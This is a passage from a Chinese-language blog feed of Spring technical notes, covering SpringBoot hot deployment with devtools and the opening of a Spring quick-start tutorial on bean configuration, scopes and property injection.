book.setPrice(bookCase.getPrice());</span><br><span class="line">		bookService.save(book);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">$&#123;random.int&#125;</span>              <span class="comment"># 随机整数</span></span><br><span class="line"><span class="string">$&#123;random.int(10)&#125;</span>          <span class="comment"># 10以内随机数</span></span><br><span class="line"><span class="string">$&#123;random.int（10，</span> <span class="number">20</span><span class="string">）&#125;</span>    <span class="comment"># 10 到 20 随机数</span></span><br><span class="line"><span class="string">$&#123;random.uuid&#125;</span>             <span class="comment"># 随机 uuid</span></span><br><span class="line"><span class="string">$&#123;random.value&#125;</span>            <span class="comment"># 随机字符串，MD5字符串，32位   </span></span><br><span class="line"><span class="string">$&#123;random.long&#125;</span>             <span class="comment"># 随机整数（long 范围）</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>技术笔记</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>后端</tag>
        <tag>SpringBoot</tag>
      </tags>
  </entry>
  <entry>
    <title>SpringBoot热部署</title>
    <url>/posts/75ee909c.html</url>
    <content><![CDATA[<blockquote>
<p><strong>热部署的理解</strong><br>通俗点说就是你的程序更改了，需要重新启动服务器再才会生效，嫌麻烦？嫌耗时？不想重启，服务器会悄悄的把更新好的程序重新加载一次，这就是热部署。</p>
</blockquote>
<h1 id="一、手动启动热部署"><a href="#一、手动启动热部署" class="headerlink" title="一、手动启动热部署"></a>一、手动启动热部署</h1><ul>
<li>步骤①：导入对应的坐标</li>
</ul>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-devtools<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">optional</span>&gt;</span>true<span class="tag">&lt;/<span class="name">optional</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>步骤②：当程序更改后，如图点击选项，重新构建项目，可以使用快捷键<br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815132033.png" alt=" "><br>对应的快捷键</li>
</ul>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">CTRL</span>&gt;</span>+<span class="tag">&lt;<span class="name">F9</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>以上过程就实现了SpringBoot工程的热部署，是不是挺简单的。不过这里需要把底层的工作工程给普及一下。</p>
<p><strong>启动热部署</strong></p>
<ul>
<li><p><strong>关于热部署</strong></p>
<ul>
<li>重启（Restart）：自定义开发代码，包含类、页面、配置文件等，加载位置restart类加载器。</li>
<li>重载（Reload）：jar包，加载位置base类加载器。</li>
</ul>
</li>
</ul>
<blockquote>
<ul>
<li>第一次启动应用：重启 + 重载</li>
<li>启用热部署：重启</li>
</ul>
<hr>
<p>当SpringBoot项目启动时，base类加载器执行，加载jar包中的信息后，restart类加载器执行，加载开发者制作的内容。当执行构建项目后，由于jar中的信息不会变化，因此base类加载器无需再次执行，所以仅仅运行restart类加载即可，也就是将开发者自己制作的内容重新加载就行了，这就完成了一次热部署的过程，也可以说热部署的过程实际上是重新加载restart类加载器中的信息。</p>
</blockquote>
<hr>
<h1 id="二、自动启动热部署"><a href="#二、自动启动热部署" class="headerlink" title="二、自动启动热部署"></a>二、自动启动热部署</h1><p>上述提到在修改完代码后需要点击相应选型或按快捷键，如果我们在修改完代码后，能自动地完成热部署，不用点击任何选项，这就是自动启动热部署。</p>
<ul>
<li>步骤①：设置自动构建项目</li>
</ul>
<p>点击【File】，选择【settings…】,在面板左侧的菜单中找到【Compile】选项，然后勾选【Build project automatically】</p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815132043.png" alt=" "></p>
<ul>
<li>步骤②：允许在程序运行时进行自动构建</li>
</ul>
<p> 使用快捷键【Ctrl】+【Alt】+【Shit】+【&#x2F;】打开维护面板，选择第1项【Registry…】</p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815132047.png" alt=" "><br>在选项中勾选对应项</p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815132052.png" alt=" "></p>
<p>对于idea2021，在如下地方进行修改：</p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815132059.png" alt=" "></p>
<p>如果你每敲一个字母，服务器就重新构建一次，这未免有点太频繁了，所以idea设置当idea工具失去焦点<code>5秒</code>后进行热部署。其实就是你从idea工具中切换到其他工具时进行热部署，比如改完程序需要到浏览器上去调试，这个时候idea就自动进行热部署操作。</p>
<hr>
<h1 id="三、热部署范围配置"><a href="#三、热部署范围配置" class="headerlink" title="三、热部署范围配置"></a>三、热部署范围配置</h1><p>为了便于管理，在程序目录中除了有代码，还有可能有文档，如果修改了一下文档，这个时候会进行热部署吗？不管是否进行热部署，这个过程我们需要自己控制才比较合理，这个控制的过程就是热部署的范围配置。</p>
<p>通过修改项目中的文件，可以发现其实并不是所有的文件修改都会激活热部署的，原因在于在开发者工具中有一组配置，当满足了配置中的条件后，才会启动热部署，配置中默认不参与热部署的目录信息如下：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">/META-INF/maven</span><br><span class="line">/META-INF/resources</span><br><span class="line">/resources</span><br><span class="line">/static</span><br><span class="line">/public</span><br><span class="line">/templates</span><br></pre></td></tr></table></figure>

<p>以上目录中的文件如果发生变化，是不参与热部署的。如果想修改配置，可以通过<code>application.yml</code>文件进行设定哪些文件不参与热部署操作。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">devtools:</span></span><br><span class="line">    <span class="attr">restart:</span></span><br><span class="line">      <span class="comment"># 设置不参与热部署的目录或文件</span></span><br><span class="line">      <span class="attr">exclude:</span> <span class="string">static/**,</span> <span class="string">public/**</span></span><br></pre></td></tr></table></figure>




<hr>
<h1 id="四、关闭热部署"><a href="#四、关闭热部署" class="headerlink" title="四、关闭热部署"></a>四、关闭热部署</h1><p> 热部署功能是一个典型的开发阶段使用的功能，到了线上环境运行程序时，这个功能就没有意义了。如何关闭热部署功能呢？</p>
<ul>
<li>通过配置文件关闭</li>
</ul>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">devtools:</span></span><br><span class="line">    <span class="attr">restart:</span></span><br><span class="line">      <span class="comment"># true 开启热部署， false 关闭热部署</span></span><br><span class="line">      <span class="attr">enabled:</span> <span class="literal">false</span></span><br></pre></td></tr></table></figure>


<p> 如果当心配置文件层级过多导致相符覆盖最终引起配置失效，可以提高配置的层级，在更高层级中配置关闭热部署。例如在启动容器前通过系统属性设置关闭热部署功能。</p>
<ul>
<li>在启动容器前通过系统属性设置关闭</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SpringBootTest1Application</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.setProperty(<span class="string">&quot;spring.devtools.restart.enabled&quot;</span>, <span class="string">&quot;false&quot;</span>);</span><br><span class="line">        SpringApplication.run(SpringBootTest1Application.class, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>技术笔记</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>后端</tag>
        <tag>SpringBoot</tag>
      </tags>
  </entry>
  <entry>
    <title>Spring快速入门</title>
    <url>/posts/9542c7f4.html</url>
    <content><![CDATA[<h1 id="一、Spring前言"><a href="#一、Spring前言" class="headerlink" title="一、Spring前言"></a>一、Spring前言</h1><h2 id="1-Spring简介"><a href="#1-Spring简介" class="headerlink" title="1. Spring简介"></a>1. Spring简介</h2><ul>
<li><strong>Spring是分层的Java SE&#x2F;EE 应用full-stack轻量级开源框架，以<code>IoC</code>（Inverse of Control：<code>反转控制</code>）和<code>AOP</code>（Aspect Oriented Programming：<code>面向切面编程</code>）为内核。</strong></li>
<li><strong>Spring提供了<code>展现层SpringMVC</code>和<code>持久层Spring JDBCTemplate</code>以及<code>业务层事务管理</code>等众多的企业级业务技术，还整合了开源世界众多著名的第三方框架和类库，逐渐成为使用最多的JavaEE企业级应用开源框架。</strong></li>
</ul>
<h2 id="2-Spring优势"><a href="#2-Spring优势" class="headerlink" title="2. Spring优势"></a>2. Spring优势</h2><p><strong>① 方便解耦，简化开发</strong><br>通过Spring提供的IoC容器，可以将对象间的依赖关系交由Spring进行控制，避免硬编码所造成的过度耦合。用户也不必再为单例模式类、属性文件解析等这些很底层的需求编写代码，可以更专注于上层的应用。<br><strong>② AOP编程的支持</strong><br>通过Spring的AOP功能，方便进行面向切面编程，许多不容易用传统OOP实现的功能可以通过AOP实现。<br><strong>③ 声明式事务的支持</strong><br>可以将我们从单调烦闷的事务管理代码中解脱出来，通过声明式方式灵活的进行事务管理，提高开发效率和质量。<br><strong>④ 方便程序测试</strong><br>Spring对Junit4支持，可以用非容器依赖的编程方式进行几乎所有的测试工作，测试不再是昂贵的操作，而是随手可做的事情。<br><strong>⑤ 方便集成各种框架</strong><br>Spring对各种流行框架（Struts、Hibernate、Hessian、Quartz等）的支持<br><strong>⑥ 降低JavaEE API的使用难度</strong><br>Spring对JavaEE API（如JDBC、JavaMail、远程调用等）进行了薄薄的封装层，使这些API的使用难度大为降低。<br><strong>…</strong></p>
<blockquote>
<p><strong>一句话，Spring是一个轻量级的控制反转（IOC）和面向切面（AOP）的容器（框架）。</strong></p>
</blockquote>
<h2 id="3-Spring体系结构"><a href="#3-Spring体系结构" class="headerlink" title="3. Spring体系结构"></a>3. Spring体系结构</h2><p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815155610.png"></p>
<p>Spring 框架是一个分层架构，由 7 个定义良好的模块组成。Spring 模块构建在核心容器之上，核心容器定义了创建、配置和管理 bean 的方式 。<br>组成 Spring 框架的每个模块（或组件）都可以单独存在，或者与其他一个或多个模块联合实现。每个模块的功能如下：</p>
<blockquote>
<p><strong>Data Access&#x2F;Integration（数据访问／集成）</strong><br>数据访问&#x2F;集成层包括 JDBC、ORM、OXM、JMS 和 Transactions 模块，具体介绍如下。</p>
<ul>
<li><code>JDBC 模块</code>：提供了一个 JDBC 的抽象层，大幅度减少了在开发过程中对数据库操作的编码。 </li>
<li><code>ORM 模块</code>：对流行的对象关系映射API，包括 JPA、JDO、Hibernate 和 iBatis 提供了的集成层。 </li>
<li><code>OXM 模块</code>：提供了一个支持对象&#x2F;XML映射的抽象层实现，如 JAXB、Castor、XMLBeans、JiBX 和 XStream。 </li>
<li><code>JMS 模块</code>：指 Java消息服务，包含的功能为生产和消费的信息。 Transactions 事务模块：支持编程和声明式事务管理实现特殊接口类，并为所有的 POJO。</li>
<li><code>Transactions 事务模块</code>：支持编程和声明式事务管理实现特殊接口类，并为所有的 POJO。</li>
</ul>
<hr>
<p><strong>Web 模块</strong><br>Spring 的 Web 层包括 Web、Servlet、Struts 和 Portlet 组件，具体介绍如下。    </p>
<ul>
<li><code>Web 模块</code>：提供了基本的 Web 开发集成特性，例如多文件上传功能、使用的 Servlet 监听器的 IoC 容器初始化以及 Web应用上下文。    </li>
<li><code>Servlet模块</code>：包括 Spring 模型—视图—控制器（MVC）实现 Web 应用程序。    </li>
<li><code>Struts模块</code>：包含支持类内的 Spring 应用程序，集成了经典的 Struts Web 层。    </li>
<li><code>Portlet 模块</code>：提供了在 Portlet环境中使用 MVC实现，类似 Web-Servlet 模块的功能。</li>
</ul>
<hr>
<p><strong>Core Container（核心容器）</strong><br>Spring 的核心容器是其他模块建立的基础，由 Beans 模块、Core 核心模块、Context 上下文模块和 Expression Language 表达式语言模块组成，具体介绍如下。</p>
<ul>
<li><code>Beans 模块</code>：提供了 BeanFactory，是工厂模式的经典实现，Spring 将管理对象称为 Bean。 </li>
<li><code>Core 核心模块</code>：提供了Spring 框架的基本组成部分，包括 IoC 和 DI 功能。 </li>
<li><code>Context 上下文模块</code>：建立在核心和 Beans模块的基础之上，它是访问定义和配置任何对象的媒介。ApplicationContext 接口是上下文模块的焦点。 </li>
<li><code>ExpressionLanguage 模块</code>：是运行时查询和操作对象图的强大的表达式语言。</li>
</ul>
<hr>
<p><strong>其他模块</strong><br>Spring的其他模块还有 AOP、Aspects、Instrumentation 以及 Test 模块，具体介绍如下。</p>
<ul>
<li><code>AOP 模块</code>：提供了面向切面编程实现，允许定义方法拦截器和切入点，将代码按照功能进行分离，以降低耦合性。</li>
<li><code>Aspects 模块</code>：提供与 AspectJ 的集成，是一个功能强大且成熟的面向切面编程（AOP）框架。</li>
<li><code>Instrumentation 模块</code>：提供了类工具的支持和类加载器的实现，可以在特定的应用服务器中使用。</li>
<li><code>Test 模块</code>：支持 Spring 组件，使用 JUnit 或 TestNG 框架的测试。</li>
</ul>
</blockquote>
<h1 id="二、Spring开发步骤"><a href="#二、Spring开发步骤" class="headerlink" title="二、Spring开发步骤"></a>二、Spring开发步骤</h1><blockquote>
<p><strong>① 导入Spring的坐标</strong></p>
</blockquote>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-context<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">version</span>&gt;</span>5.3.20<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<hr>
<blockquote>
<p><strong>② 编写接口与实现类</strong></p>
</blockquote>
<hr>
<blockquote>
<p><strong>③ 创建Spring核心配置文件（一般命名为 applicationContext.xml），并在配置文件中配置各种实现类</strong></p>
</blockquote>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!--   默认无参构造方法实例化--&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;userDao&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.tyt.dao.impl.UserDaoImpl&quot;</span>&gt;</span></span><br><span class="line">	</span><br><span class="line">	<span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>
<hr>
<blockquote>
<p><strong>④ 使用Spring的API获取Bean的实例</strong></p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">ApplicationContext</span> <span class="variable">app</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPathXmlApplicationContext</span>(<span class="string">&quot;applicationContext.xml&quot;</span>);</span><br><span class="line">        UserDao userDao= app.getBean(UserDao.class);</span><br><span class="line">        <span class="comment">// UserDao userDao= (UserDao)app.getBean(&quot;UserDao&quot;);</span></span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="三、Spring配置文件"><a href="#三、Spring配置文件" class="headerlink" title="三、Spring配置文件"></a>三、Spring配置文件</h1><p><strong>用于配置对象交由Spring创建，默认情况调用类中的<code>无参构造函数</code>，如果没有无参构造函数则不能创建成功。</strong></p>
<h2 id="1-Bean基本配置（id，class）"><a href="#1-Bean基本配置（id，class）" class="headerlink" title="1. Bean基本配置（id，class）"></a>1. Bean基本配置（id，class）</h2><blockquote>
<ul>
<li><strong><code>id</code>：Bean实例在Spring容器中的<code>唯一标识</code>，不允许重复</strong></li>
<li><strong><code>class</code>：要实例化的Bean的<code>全限定</code>名称（包名 + 类名）</strong></li>
</ul>
</blockquote>
<hr>
<h2 id="2-Bean范围配置（scope）"><a href="#2-Bean范围配置（scope）" class="headerlink" title="2. Bean范围配置（scope）"></a>2. Bean范围配置（scope）</h2><blockquote>
<ul>
<li><strong><code>scope</code>：指对象的作用范围，取值如下：</strong></li>
</ul>
<table>
<thead>
<tr>
<th>取值范围</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>singleton（单例模式）</code></td>
<td><code>默认值，单例的</code>，整个Spring容器仅存在一个Bean实例</td>
</tr>
<tr>
<td><code>prototype（原型模式）</code></td>
<td><code>多例的</code>,整个Spring容器存在多个实例，每次从容器中调用Bean时，都返回一个新的实例</td>
</tr>
<tr>
<td>request</td>
<td><code>Web</code>项目中，每次HTTP请求都会创建一个新的Bean，将对象存入requet域中</td>
</tr>
<tr>
<td>session</td>
<td><code>Web</code>项目中，同一个HTTP sesion中共享一个Bean，不同session使用不同Bean</td>
</tr>
<tr>
<td><strong>① 当scope &#x3D; <code>singleton</code>:</strong></td>
<td></td>
</tr>
<tr>
<td><strong>Bean实例化个数</strong>：1个</td>
<td></td>
</tr>
<tr>
<td><strong>Bean实例化时机</strong>：Spring核心文件被加载时</td>
<td></td>
</tr>
<tr>
<td><strong>Bean生命周期</strong>：</td>
<td></td>
</tr>
</tbody></table>
<ul>
<li><strong>对象创建</strong>：当应用加载，创建容器时，对象被创建</li>
<li><strong>对象运行</strong>：只要容器在，对象一直活着</li>
<li><strong>对象销毁</strong>：当应用卸载，销毁容器时，对象就被销毁了</li>
</ul>
<hr>
<h2 id="②-当scope-prototype-Bean实例化个数：多个Bean实例化时机：当调用getBean-方法实例化BeanBean生命周期：-对象创建：当使用对象，创建新的对象实例-对象运行：只要对象在使用中，就一直活着-对象销毁：当对象长时间不用时，被Java的垃圾回收器回收"><a href="#②-当scope-prototype-Bean实例化个数：多个Bean实例化时机：当调用getBean-方法实例化BeanBean生命周期：-对象创建：当使用对象，创建新的对象实例-对象运行：只要对象在使用中，就一直活着-对象销毁：当对象长时间不用时，被Java的垃圾回收器回收" class="headerlink" title="② 当scope &#x3D; prototype:Bean实例化个数：多个Bean实例化时机：当调用getBean()方法实例化BeanBean生命周期：- 对象创建：当使用对象，创建新的对象实例- 对象运行：只要对象在使用中，就一直活着- 对象销毁：当对象长时间不用时，被Java的垃圾回收器回收"></a><strong>② 当scope &#x3D; <code>prototype</code>:</strong><br><strong>Bean实例化个数</strong>：多个<br><strong>Bean实例化时机</strong>：当调用getBean()方法实例化Bean<br><strong>Bean生命周期</strong>：<br>- <strong>对象创建</strong>：当使用对象，创建新的对象实例<br>- <strong>对象运行</strong>：只要对象在使用中，就一直活着<br>- <strong>对象销毁</strong>：当对象长时间不用时，被Java的垃圾回收器回收</h2><h2 id="③-当scope-request-Bean实例化个数：多个Bean实例化时机：每一次HTTP请求都会实例化BeanBean生命周期：-对象创建：在每次HTTP请求时-对象运行：请求未处理完-对象销毁：处理请求结束"><a href="#③-当scope-request-Bean实例化个数：多个Bean实例化时机：每一次HTTP请求都会实例化BeanBean生命周期：-对象创建：在每次HTTP请求时-对象运行：请求未处理完-对象销毁：处理请求结束" class="headerlink" title="③ 当scope &#x3D; request:Bean实例化个数：多个Bean实例化时机：每一次HTTP请求都会实例化BeanBean生命周期：- 对象创建：在每次HTTP请求时- 对象运行：请求未处理完- 对象销毁：处理请求结束"></a><strong>③ 当scope &#x3D; <code>request</code>:</strong><br><strong>Bean实例化个数</strong>：多个<br><strong>Bean实例化时机</strong>：每一次HTTP请求都会实例化Bean<br><strong>Bean生命周期</strong>：<br>- <strong>对象创建</strong>：在每次HTTP请求时<br>- <strong>对象运行</strong>：请求未处理完<br>- <strong>对象销毁</strong>：处理请求结束</h2><p><strong>④ 当scope &#x3D; <code>session</code>:</strong><br><strong>Bean实例化个数</strong>：多个<br><strong>Bean实例化时机</strong>：session创造时<br><strong>Bean生命周期</strong>：</p>
<ul>
<li><strong>对象创建</strong>：session创造时</li>
<li><strong>对象运行</strong>：session一直有效时</li>
<li><strong>对象销毁</strong>：session废弃</li>
</ul>
</blockquote>
<hr>
<h2 id="3-Bean生命周期配置（init-method，destroy-method）"><a href="#3-Bean生命周期配置（init-method，destroy-method）" class="headerlink" title="3. Bean生命周期配置（init-method，destroy-method）"></a>3. Bean生命周期配置（init-method，destroy-method）</h2><blockquote>
<ul>
<li><strong><code>init-method</code>：指定类中的<code>初始化</code>方法名称</strong></li>
<li><strong><code>destroy-method</code>：指定类中<code>销毁</code>方法名称</strong></li>
</ul>
</blockquote>
<hr>
<h2 id="4-Bean属性注入（property，constructor-arg）"><a href="#4-Bean属性注入（property，constructor-arg）" class="headerlink" title="4. Bean属性注入（property，constructor-arg）"></a>4. Bean属性注入（property，constructor-arg）</h2><p><strong>定义两个类方便后面的例子演示，如下：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserDaoImpl</span> <span class="keyword">implements</span> <span class="title class_">UserDao</span> &#123;</span><br><span class="line">    </span><br><span class="line">	<span class="keyword">private</span> String username;</span><br><span class="line">	<span class="keyword">private</span> Integer age;</span><br><span class="line">	<span class="keyword">private</span> List&lt;String &gt; stringList;</span><br><span class="line">	<span class="keyword">private</span> Map&lt;String, User&gt; userMap;</span><br><span class="line">	<span class="keyword">private</span> Properties properties;</span><br><span class="line">	<span class="keyword">private</span> String[] hobby;</span><br><span class="line">	<span class="keyword">private</span> Set&lt;String&gt; set;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="title function_">UserDaoImpl</span><span class="params">()</span>&#123;</span><br><span class="line">	</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="title function_">UserDaoImpl</span><span class="params">(String username, Integer age, Set&lt;String&gt; set)</span> &#123;</span><br><span class="line">		<span class="built_in">this</span>.username = username;</span><br><span class="line">		<span class="built_in">this</span>.age = age;</span><br><span class="line">		<span class="built_in">this</span>.set = set;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setHobby</span><span class="params">(String[] hobby)</span> &#123;</span><br><span class="line">		<span class="built_in">this</span>.hobby = hobby;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setSet</span><span class="params">(Set&lt;String&gt; set)</span> &#123;</span><br><span class="line">		<span class="built_in">this</span>.set = set;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setUsername</span><span class="params">(String username)</span> &#123;</span><br><span class="line">		<span class="built_in">this</span>.username = username;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(Integer age)</span> &#123;</span><br><span class="line">		<span class="built_in">this</span>.age = age;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setStringList</span><span class="params">(List&lt;String&gt; stringList)</span> &#123;</span><br><span class="line">		<span class="built_in">this</span>.stringList = stringList;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setUserMap</span><span class="params">(Map&lt;String, User&gt; userMap)</span> &#123;</span><br><span class="line">		<span class="built_in">this</span>.userMap = userMap;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setProperties</span><span class="params">(Properties properties)</span> &#123;</span><br><span class="line">		<span class="built_in">this</span>.properties = properties;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserServiceImpl</span> <span class="keyword">implements</span> <span class="title class_">UserService</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> UserDao userDao;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">UserServiceImpl</span><span class="params">(UserDao userDao)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.userDao = userDao;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">UserServiceImpl</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setUserDao</span><span class="params">(UserDao userDao)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.userDao = userDao;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1-property基本配置"><a href="#1-property基本配置" class="headerlink" title="1. property基本配置"></a>1. property基本配置</h3><blockquote>
<ul>
<li><strong><code>name</code>：属性名称</strong></li>
<li><strong><code>value</code>：注入的普通属性值</strong></li>
<li><strong><code>ref</code>：注入的对象引用值</strong></li>
</ul>
</blockquote>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;userDao&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.tyt.dao.impl.UserDaoImpl&quot;</span> <span class="attr">scope</span>=<span class="string">&quot;prototype&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;张三&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;age&quot;</span> <span class="attr">value</span>=<span class="string">&quot;17&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;userService&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.tyt.service.impl.UserServiceImpl&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;userDao&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;userDao&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<hr>
<h3 id="2-list列表注入"><a href="#2-list列表注入" class="headerlink" title="2. list列表注入"></a>2. list列表注入</h3><blockquote>
<ul>
<li><strong><code>list</code>：注入List数据类型变量</strong></li>
</ul>
</blockquote>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;userDao&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.tyt.dao.impl.UserDaoImpl&quot;</span> <span class="attr">scope</span>=<span class="string">&quot;prototype&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;stringList&quot;</span> &gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">value</span>&gt;</span>aaa<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">value</span>&gt;</span>aaa<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">value</span>&gt;</span>aaa<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span 